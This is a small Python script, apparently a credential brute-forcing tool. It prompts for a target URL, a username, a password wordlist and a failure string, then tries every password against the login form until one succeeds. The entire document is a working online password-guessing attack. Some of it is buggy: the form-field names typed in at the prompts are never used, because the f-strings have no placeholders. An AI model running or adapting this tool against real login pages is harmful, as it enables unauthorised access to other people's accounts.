import requests

url = input("Enter URL: ")
username = input("Enter username for the account to bruteforce: ")
passwordfile = input("Enter the name of password file: ")
failed_login = input("Enter string that appears when login failed: ")
cookie_value = input("Enter cookie(Optional): ")
username_form = input("Enter name form for username in source code")
password_form = input("Enter name form for password in source code")
submit_form = input("Enter name form for submit button in source code")

def crack(username,url):
    for password in passwords:
        password = password.strip()
        print('Cheking '+ password + ' password...')
        data = {f'username_form':username, f'password_form':password, f'submit_form':'submit'} 
        if cookie_value != '':
            responce = requests.get(url,params={'username':username, 'password':password, 'Login':'Login'}, cookies={'Cookie': cookie_value})
        else:
            responce = requests.post(url, data=data)
        if failed_login in responce.content.decode():
            pass
        else:
            print("Found password ==> " + password)
            exit()

with open(passwordfile, 'r') as passwords:
    crack(username,url)

print('Password not found in the list')
